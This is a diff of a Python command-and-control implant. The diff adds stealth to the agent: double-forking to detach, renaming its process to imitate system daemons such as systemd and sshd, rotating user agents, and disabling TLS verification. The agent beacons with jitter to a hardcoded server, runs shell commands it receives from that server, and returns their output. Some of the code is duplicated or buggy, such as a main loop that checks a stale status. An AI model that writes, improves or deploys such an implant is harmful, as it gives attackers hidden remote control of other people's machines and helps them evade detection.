@@ -1,10 +1,32 @@
 #!/usr/bin/env python3
-import os, sys, json, base64, time, random, urllib, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl
-from urllib.parse import urlencode
+import os, sys, ctypes, random
 
-import platform, os, re, ctypes, getpass, socket, json, urllib, ssl, time
-import urllib.request
-import urllib.error
+# Immediate stealth - before any other imports
+def immediate_stealth():
+    try:
+        # Clear command line arguments
+        new_name = random.choice(["systemd", "kthreadd", "ksoftirqd", "migration"])
+        sys.argv = [new_name]
+        
+        # Change process name
+        ctypes.CDLL(None).prctl(15, new_name.encode())
+        
+        # Fork to detach
+        if os.fork() > 0:
+            os._exit(0)
+        os.setsid()
+        if os.fork() > 0:
+            os._exit(0)
+        
+        return True
+    except:
+        return False
+
+# Apply stealth immediately
+immediate_stealth()
+
+import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
+from urllib.parse import urlencode
 
 SERVER_URL="https://192.168.10.11:443/"
 AGENT_NAME="example1"
@@ -27,11 +49,6 @@ def get_platform_dist():
     Helper func that returns a string with the platform distribution.
     """
     sys_platform = platform.system()
-
-    # --- Windows Handling ---
-    if sys_platform == "Windows":
-        release, version, csd, ptype = platform.win32_ver()
-        return ("Windows", release, version)
 
     # --- Linux Handling ---
     if sys_platform == "Linux":
@@ -64,7 +81,7 @@ def get_platform_dist():
 def get_os(simple=False):
     """
     Gets the approximate OS used, optionally simplified to highest level possible.
-    For example: Ubuntu, Debian, Rocky, RHEL, Windows Workstation (7 8 10 11), Windows Server (2012 2016 2022 2025)
+    For example: Ubuntu, Debian, Rocky, RHEL
 
     Args: simple(Bool)
     Returns: osType(String)
@@ -77,8 +94,8 @@ def get_os(simple=False):
         return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)
 
     if simple:
-        return platform.system() # Windows, FreeBSD
-    return f"{platform.system()} {platform.release()}" #Windows 10, Windows 2016Server, FreeBSD XYZ
+        return platform.system() # FreeBSD
+    return f"{platform.system()} {platform.release()}" #FreeBSD XYZ
 
 def get_perms():
     """
@@ -86,21 +103,6 @@ def get_perms():
     Returns: isRunAsElevated(bool), runAsUser(String)
     """
     system = platform.system()
-
-    if system == "Windows":
-        try:
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except Exception:
-            is_admin = False
-        # USERDOMAIN = Returns the NetBIOS domain name
-        # Will be DOMAIN if a domain user, or hostname if local user
-        domain = os.environ.get("USERDOMAIN")
-        user = getpass.getuser()
-        if domain:
-            runAsUser = f"{domain}\\{user}"
-        else:
-            runAsUser = user
-        return is_admin, runAsUser
     
     if system in ("Linux", "FreeBSD"):
         # euid 0 - root OR sudo
@@ -151,12 +153,52 @@ def get_system_details():
     }
     return sysInfo
 
-def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=get_system_details(),server_timeout=5):
+def _stealth_request(url, data, timeout):
+    global AUTH_TOKEN
+    
+    headers = {
+        "User-Agent": random.choice([
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
+            "curl/8.2.1",
+            "Wget/1.21.3"
+        ]),
+        "Accept": "application/json,text/plain,*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Content-Type": "application/json"
+    }
+
+    try:
+        req = urllib.request.Request(
+            url,
+            data=data,
+            headers=headers,
+            method="POST"
+        )
+
+        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as response:
+            response_text = response.read().decode("utf-8", errors="ignore")
+
+            if response.getcode() == 200:
+                if "agent/beacon" in url and response_text != AUTH_TOKEN:
+                    AUTH_TOKEN = response_text
+                return True, response_text
+
+            return False, f"HTTP {response.getcode()}"
+
+    except Exception as e:
+        return False, str(e)
+
+def send_message(endpoint, message="", oldStatus=True, newStatus=True, 
+                systemInfo=get_system_details(), server_timeout=5, 
+                stealth_mode=False):
     """
     Sends the specified data to the server.
     Handles the full process and attaching agent name/auth/system details.
 
-    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
+    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool),stealth_mode(bool)
     Returns: status(Bool)
     """
     global AUTH_TOKEN
@@ -189,29 +231,33 @@ def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=ge
         # Prepare data as JSON for transmit
         data = json.dumps(payload).encode("utf-8")
 
-        # Build request
-        req = urllib.request.Request(
-            url,
-            data=data,
-            headers={"Content-Type": "application/json"},
-            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
-        )
+        if stealth_mode:
+            # Use stealth implementation
+            return _stealth_request(url, data, server_timeout)
+        else:
+            # Use original implementation
+            req = urllib.request.Request(
+                url,
+                data=data,
+                headers={"Content-Type": "application/json"},
+                method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
+            )
 
-        # Send payload
-        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
-            if response.getcode() == 200:
-                # Good result! Now parse and return the endpoint
-                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
-                response_text = response.read().decode('utf-8')
-                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
-                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
-                if "agent/beacon" in endpoint:
-                    if response_text != AUTH_TOKEN:
-                        AUTH_TOKEN = response_text
-                        print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
-                return True, response_text
-            else:
-                print_debug(f"send_message({url}): Server error: {response.getcode()}")
+            # Send payload
+            with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
+                if response.getcode() == 200:
+                    # Good result! Now parse and return the endpoint
+                    print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
+                    response_text = response.read().decode('utf-8')
+                    # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
+                    # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
+                    if "agent/beacon" in endpoint:
+                        if response_text != AUTH_TOKEN:
+                            AUTH_TOKEN = response_text
+                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
+                    return True, response_text
+                else:
+                    print_debug(f"send_message({url}): Server error: {response.getcode()}")
 
     # Error handling
     # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
@@ -223,92 +269,366 @@ def send_message(endpoint,message="",oldStatus=True,newStatus=True,systemInfo=ge
         print_debug(f"send_message({url}): Beacon error: {e}")
     return False, ""
 
-def execute_command(command):
-    """Execute a command and return the output"""
+def hide_process_name():
+    """Change the process name to something legitimate"""
     try:
-        if command.startswith("c2_"):
-            return handle_builtin_command(command)
-        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-        return result
-    except subprocess.CalledProcessError as e:
-        return f"Command failed with error: {e.output}"
-    except Exception as e:
-        return f"Error executing command: {str(e)}"
+        # Choose a legitimate system process name
+        new_name = random.choice([
+            "systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp",
+            "rsyslog", "networkd", "dbus-daemon", "cron", "sshd"
+        ])
+        
+        # Change process name using prctl (Linux)
+        ctypes.CDLL(None).prctl(15, new_name.encode())
+        
+        # Also modify argv to hide the script name
+        import sys
+        sys.argv[0] = new_name
+        
+        return True
+    except:
+        return False
 
-def handle_builtin_command(command):
-    """Handle built-in C2 commands"""
-    parts = command.split()
-    cmd_type = parts[0]
+def fork_and_hide():
+    """Fork the process and exit the parent to hide the original process"""
+    try:
+        # Fork the process
+        pid = os.fork()
+        
+        if pid > 0:
+            # Parent process exits
+            os._exit(0)
+        
+        # Child process continues
+        os.setsid()
+        os.umask(0)
+        
+        # Fork again to prevent the process from acquiring a controlling terminal
+        pid = os.fork()
+        
+        if pid > 0:
+            # Second parent exits
+            os._exit(0)
+            
+        return True
+    except:
+        return False
+
+class AdaptiveC2Client:
+    def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
+        self.c2_server = c2_server
+        self.secret_key = secret_key
+        self.sleep_time = sleep_time
+        self.jitter = jitter
+        self.stealth_mode = stealth_mode
+        
+        # Use more realistic process name instead of Python
+        self.process_name = self.get_legitimate_process_name()
+        
+        # Generate unique host ID based on hardware identifiers
+        self.beacon_id = self.generate_stable_id()
+        self.hostname = socket.gethostname()
+        self.ip_address = self.get_local_ip()
+        self.user = os.getenv('USER') or os.getenv('USERNAME')
+        self.os_info = f"{platform.system()} {platform.release()}"
+        self.running = True
+        
+        # Detect installed services for context
+        self.environment_profile = self.detect_environment()
+        
+        # More realistic user agents that match common applications
+        self.user_agents = [
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "curl/8.2.1",
+            "Wget/1.21.3"
+        ]
     
-    if cmd_type == "c2_info":
-        sysinfo = get_system_details()
-        return json.dumps({
-            "hostname": sysinfo["hostname"],
-            "ip_address": sysinfo["ipadd"],
-            "user": sysinfo["executionUser"],
-            "os_info": sysinfo["os"],
-            "admin": sysinfo["executionAdmin"]
-        }, indent=2)
+    def get_legitimate_process_name(self):
+        """Return a process name that blends in with common Linux system processes"""
+        return random.choice([
+            "systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp",
+            "rsyslog", "networkd", "dbus-daemon", "cron", "sshd"
+        ])
     
-    elif cmd_type == "c2_sleep" and len(parts) > 1:
+    def generate_stable_id(self):
+        """Generate a stable ID based on hardware identifiers that persists across reboots"""
         try:
-            sleep_time = int(parts[1])
-            return f"Sleep time would be updated to {sleep_time} seconds (not implemented in this version)"
+            # Try to get machine ID from /etc/machine-id or DMI
+            if os.path.exists("/etc/machine-id"):
+                with open("/etc/machine-id", "r") as f:
+                    hw_id = f.read().strip()
+            elif os.path.exists("/sys/class/dmi/id/product_uuid"):
+                with open("/sys/class/dmi/id/product_uuid", "r") as f:
+                    hw_id = f.read().strip()
+            else:
+                hw_id = f"{platform.system()}-{socket.gethostname()}-{platform.machine()}"
+            
+            # Generate a hash of the hardware ID
+            return hashlib.sha256(hw_id.encode()).hexdigest()[:16]
+        except:
+            # Fallback to original method
+            return hashlib.md5(f"{platform.system()}-{socket.gethostname()}-{platform.machine()}".encode()).hexdigest()[:16]
+    
+    def get_local_ip(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
         except: 
-            return "Invalid sleep time value"
+            return "127.0.0.1"
     
-    elif cmd_type == "c2_download" and len(parts) > 1:
+    def detect_environment(self):
+        profile = {"hostname": self.hostname, "os": self.os_info, "services": []}
+        services = [
+            ("nginx", ["systemctl", "is-active", "nginx"]),
+            ("grafana", ["systemctl", "is-active", "grafana-server"]),
+            ("apache", ["systemctl", "is-active", "apache2"]),
+            ("docker", ["systemctl", "is-active", "docker"])
+        ]
+        for service_name, cmd in services:
+            try:
+                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                if result.returncode == 0:
+                    profile["services"].append(service_name)
+            except: 
+                pass
+        return profile
+    
+    def create_signature(self, data):
+        """Generate HMAC signature for request validation."""
+        return hmac.new(self.secret_key.encode(), data, hashlib.sha256).hexdigest()
+    
+    def _make_request(self, endpoint, data, method="GET"):
+        """Make HTTPS request with enhanced stealth techniques"""
+        if self.stealth_mode:
+        # Convert data to bytes if needed
+            if isinstance(data, dict):
+                data_bytes = json.dumps(data).encode()
+            else:
+                data_bytes = data
+            return _stealth_request(f"{self.c2_server}/{endpoint}", data_bytes, timeout=10)
+    
+        headers = {
+            "User-Agent": random.choice(self.user_agents),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "DNT": "1",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache"
+        }
+        
+        # Add service-specific headers if available
+        if "nginx" in self.environment_profile["services"]:
+            headers["X-Requested-With"] = "XMLHttpRequest"
+        elif "grafana" in self.environment_profile["services"]:
+            headers["X-Grafana-Org-Id"] = "1"
+        
+        # Prepare URL and data
+        url = f"{self.c2_server}/{endpoint}"
+        if method == "GET" and data:
+            query_string = urlencode(data)
+            url += f"?{query_string}"
+        
         try:
-            with open(parts[1], "rb") as f:
-                file_data = f.read()
-            return json.dumps({
-                "path": parts[1], 
-                "size": len(file_data), 
-                "data": base64.b64encode(file_data).decode()
-            })
-        except Exception as e: 
-            return f"Error downloading file: {str(e)}"
+            # Parse URL
+            parsed_url = urllib.parse.urlparse(url)
+            hostname = parsed_url.hostname
+            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
+            path = parsed_url.path + ('?' + parsed_url.query if parsed_url.query else '')
+            
+            # Create SSL context
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            # Create socket connection
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if parsed_url.scheme == 'https':
+                sock = context.wrap_socket(sock, server_hostname=hostname)
+            
+            sock.settimeout(10)
+            sock.connect((hostname, port))
+            
+            # Prepare request
+            if method == "GET":
+                request = f"GET {path} HTTP/1.1\r\n"
+            else:
+                request = f"POST {path} HTTP/1.1\r\n"
+            
+            # Add headers
+            request += f"Host: {hostname}\r\n"
+            for header, value in headers.items():
+                request += f"{header}: {value}\r\n"
+            
+            # Add content length for POST requests
+            if method == "POST" and data:
+                post_data = json.dumps(data).encode()
+                request += f"Content-Length: {len(post_data)}\r\n"
+                request += "Content-Type: application/json\r\n"
+            
+            request += "\r\n"
+            
+            # Send request
+            if method == "POST" and data:
+                sock.sendall(request.encode() + post_data)
+            else:
+                sock.sendall(request.encode())
+            
+            # Receive response
+            response_data = b""
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response_data += chunk
+            
+            sock.close()
+            
+            # Parse response
+            response_text = response_data.decode('utf-8', errors='ignore')
+            headers, body = response_text.split('\r\n\r\n', 1)
+            
+            # Extract status code
+            status_line = headers.split('\r\n')[0]
+            status_code = int(status_line.split(' ')[1])
+            
+            # Create a mock response object
+            class MockResponse:
+                def __init__(self, status_code, text):
+                    self.status_code = status_code
+                    self.text = text
+                
+                def json(self):
+                    try:
+                        return json.loads(self.text)
+                    except:
+                        return {}
+            
+            return MockResponse(status_code, body)
+            
+        except Exception as e:
+            return None
     
-    elif cmd_type == "c2_upload" and len(parts) > 2:
+    
+    def run(self):
+        # Change process name to blend in
         try:
-            file_data = base64.b64decode(parts[1])
-            with open(parts[2], "wb") as f:
-                f.write(file_data)
-            return f"Successfully uploaded {len(file_data)} bytes to {parts[2]}"
-        except Exception as e: 
-            return f"Error uploading file: {str(e)}"
-    
-    elif cmd_type == "c2_persist":
-        return "Persistence installation not implemented in this version"
-    
-    elif cmd_type == "c2_remove":
-        return "Persistence removal not implemented in this version"
-    
-    elif cmd_type == "c2_exit":
-        return "Exit command received - agent will exit after next check-in"
-    
-    else: 
-        return f"Unknown built-in command: {cmd_type}"
+            # Linux process name change
+            ctypes.CDLL(None).prctl(15, self.process_name.encode())
+        except:
+            pass
+        
+        # Initial registration
+        self._make_request("agent/beacon", {"message": "register"}, "POST")
+        
+        # Main C2 loop
+        while self.running:
+                    try:
+                        # Add jitter to sleep time to avoid predictable patterns
+                        jittered_sleep = self.sleep_time + random.randint(-self.jitter, self.jitter)
+                        time.sleep(jittered_sleep)
+                        
+                        # Check for pause state
+                        pause_response = self._make_request("agent/get_pause", {}, "POST")
+                        if pause_response and pause_response.status_code == 200:
+                            try:
+                                pause_until = float(pause_response.text)
+                                if pause_until > time.time():
+                                    time.sleep(pause_until - time.time())
+                            except:
+                                pass
+                        
+                        # Check for tasks
+                        task_response = self._make_request("agent/get_task", {}, "POST")
+                        if task_response and task_response.status_code == 200:
+                            if task_response.text != "no pending tasks":
+                                try:
+                                    data = json.loads(task_response.text)
+                                    task_id = data.get('task_id')
+                                    task_command = data.get('task')
+                                    
+                                    # Execute the task
+                                    try:
+                                        resultobj = subprocess.run(
+                                            task_command,
+                                            shell=True,
+                                            capture_output=True,
+                                            text=True,
+                                            timeout=15,
+                                            check=False
+                                        )
+                                        result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
+                                    except Exception as e:
+                                        result = f"unexpected exception when trying to execute task: {str(e)[:100]}"
+                                    
+                                    # Send result back to server
+                                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
+                                    self._make_request("agent/set_task_result", {"message": resultjson}, "POST")
+                                    
+                                except json.JSONDecodeError:
+                                    pass
+                    
+                    except Exception as e:
+                        # Handle any unexpected errors in the main loop
+                        time.sleep(30)  # Wait a bit before retrying
 
+# Integration with the existing code
 def main():
-    status, response = send_message("agent/beacon","register")
-    running = True
-    while running:
-        status, response = send_message("agent/get_pause")
+
+    fork_and_hide()
+
+    hide_process_name()
+
+    STEALTH_MODE = True
+    # Perform our initial connection to the server to setup the agent
+    status, response = send_message("agent/beacon", "register", stealth_mode=STEALTH_MODE)    
+    # Create an adaptive C2 client instance
+    c2_client = AdaptiveC2Client(
+        c2_server=SERVER_URL,
+        secret_key=AUTH_TOKEN,
+        sleep_time=60,
+        jitter=20,
+        stealth_mode=STEALTH_MODE
+    )
+    
+    # Start the adaptive C2 client in a separate thread
+    c2_thread = threading.Thread(target=c2_client.run)
+    c2_thread.daemon = True
+    c2_thread.start()
+    
+    # Enter our main agent loop (original implementation)
+    while True:
+        # (Optional) check if agent should be in paused state
+        send_message("agent/get_pause", stealth_mode=STEALTH_MODE)
         if status:
             try:
-                desired_pause_until = float(response)
-                if desired_pause_until > time.time():
-                    time.sleep(desired_pause_until - time.time())
-            except ValueError:
-                pass
+                # Use 'response' here, as that is what the server just sent back
+                desired_pause_until = float(response) 
+            except:
+                print(f"pause conversion: received {response} but could not convert to float")
+                desired_pause_until = 0
+
+            if desired_pause_until > time.time():
+                time.sleep(desired_pause_until - time.time())
         
-        status, response = send_message("agent/get_task")
+        # Let's see if any tasks are waiting for this agent
+        status, response = send_message("agent/get_task", stealth_mode=STEALTH_MODE)
         if status:
             if response != "no pending tasks":
                 data = json.loads(response)
                 task_id = data.get('task_id')
                 task_command = data.get('task')
+                
                 try:
                     resultobj = subprocess.run(
                         task_command,
@@ -319,17 +639,16 @@ def main():
                         check=False
                     )
                     result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
-                    
-                    if "c2_exit" in task_command:
-                        running = False
                 except Exception as E:
                     print_debug(f"subprocess exception: {E}")
                     result = f"unexpected exception when trying to execute task: {str(E)[:100]}"
                 finally:
                     resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
-                    status, response = send_message("agent/set_task_result",message=resultjson)
-
-        time.sleep(60)
+                    send_message("agent/set_task_result", message=resultjson, stealth_mode=STEALTH_MODE)
+        
+        # Add jitter to sleep time
+        jittered_sleep = 60 + random.randint(-10, 10)
+        time.sleep(jittered_sleep)
 
 if __name__ == "__main__":
     main()
